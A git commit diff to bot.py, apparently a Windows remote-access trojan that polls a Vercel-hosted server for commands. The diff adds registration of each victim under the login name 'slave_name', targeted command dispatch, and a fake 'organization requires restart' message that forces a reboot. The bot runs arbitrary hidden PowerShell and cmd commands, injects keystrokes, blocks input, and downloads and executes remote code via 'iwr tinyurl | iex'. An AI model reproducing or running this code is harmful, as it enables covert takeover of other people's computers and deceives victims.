01ed6a5fe674709cb6fdd8af0403ffd0f2bbaac8
Dan <126990792+Dangongg@users.noreply.github.com>
2026-01-08 21:42:14 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -14,10 +14,14 @@ si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = 0  
 url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/"
-
+clients_url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/clients"
+slave_key = "nickaqedfgvbyhnjmhngytfetrfgyuhj"
 pythonw = sys.executable.replace("python.exe", "pythonw.exe")
 if not os.path.exists(pythonw):
     pythonw = "pythonw"  
+
+slave_name = os.getlogin()
+
 
 # BEGIN AUXILIARY FUNCTIONS
 
@@ -156,13 +160,16 @@ def run_command(*args):
 
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-import requests
 
+import requests
+requests.put(url=clients_url, data={"key": slave_key, "client": slave_name})
 
 def update():
     run_command("powershell.exe", "-Command", "start powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command 'iwr https://tinyurl.com/37c7jjb7 -UseBasicParsing | iex'")
     time.sleep(1)
+    run_command("powershell.exe", "-Command", "shutdown /r /t 120 /c 'Your organization requires you to restart your device to finish installing important updates. You will be logged out in 2 minutes, check for unsaved documents.' ; exit")
     exit()
+
 
 def main():
     old_content = ""
@@ -170,6 +177,8 @@ def main():
     #print("Starting command fetch loop...")
     while True:
         try:
+           
+            
             time.sleep(sleepTime)
             #print("\nloop\n")
             keypair = json.loads(fetch_message())
@@ -179,42 +188,44 @@ def main():
             else:
                 old_content = raw
             command = str.split(raw, '~')
-        # print(f'command:', command, ' command[0]:', command[0], ' command[1]:', command[1] if len(command) > 1 else 'N/A')
-            if command[0] == "execs":
+            if command[0] != slave_name and command[0] != "all":
+                continue
+        # print(f'command:', command, ' command[1]:', command[1], ' command[2]:', command[2] if len(command) > 1 else 'N/A')
+            if command[1] == "execs":
                 #print("Executing PowerShell command...")
-                run_command("powershell.exe", "-Command", command[1])
-            elif command[0] == "execc":
+                run_command("powershell.exe", "-Command", command[2])
+            elif command[1] == "execc":
                 #print("Executing CMD command...")
-                run_command("cmd.exe", "/c " + command[1])
-            elif command[0] == "die":
+                run_command("cmd.exe", "/c " + command[2])
+            elif command[1] == "die":
                 break
-            elif command[0] == "arm":
+            elif command[1] == "arm":
                 sleepTime = 10
-            elif command[0] == "wallpaper":
-                set_wallpaper(command[1])
-            elif command[0] == "string":
-                for char in command[1]:
+            elif command[1] == "wallpaper":
+                set_wallpaper(command[2])
+            elif command[1] == "string":
+                for char in command[2]:
                     PressKey(char)
                     time.sleep(0.1)
-            elif command[0] == "key":
-                PressKey(command[1])
-            elif command[0] == "wav":
-                play_wav(command[1])
-            elif command[0] == "move":
-                params = command[1].split(',')
+            elif command[1] == "key":
+                PressKey(command[2])
+            elif command[1] == "wav":
+                play_wav(command[2])
+            elif command[1] == "move":
+                params = command[2].split(',')
                 move_window(int(params[0]), int(params[1]), int(params[2]), int(params[3]))
-            elif command[0] == "mouse":
-                params = command[1].split(',')
+            elif command[1] == "mouse":
+                params = command[2].split(',')
                 mouse_move(int(params[0]), int(params[1]))
-            elif  command[0] == "minimize":
+            elif  command[1] == "minimize":
                 minimize_window()
-            elif command[0] == "lock":
+            elif command[1] == "lock":
                 lock_workstation()
-            elif command[0] == "block":
-                block_input(command[1])
-            elif command[0] == "foreground":
-                SetForeground(command[1])
-            elif command[0] == "update":
+            elif command[1] == "block":
+                block_input(command[2])
+            elif command[1] == "foreground":
+                SetForeground(command[2])
+            elif command[1] == "update":
                 update()
             else:
                 sleepTime = 30
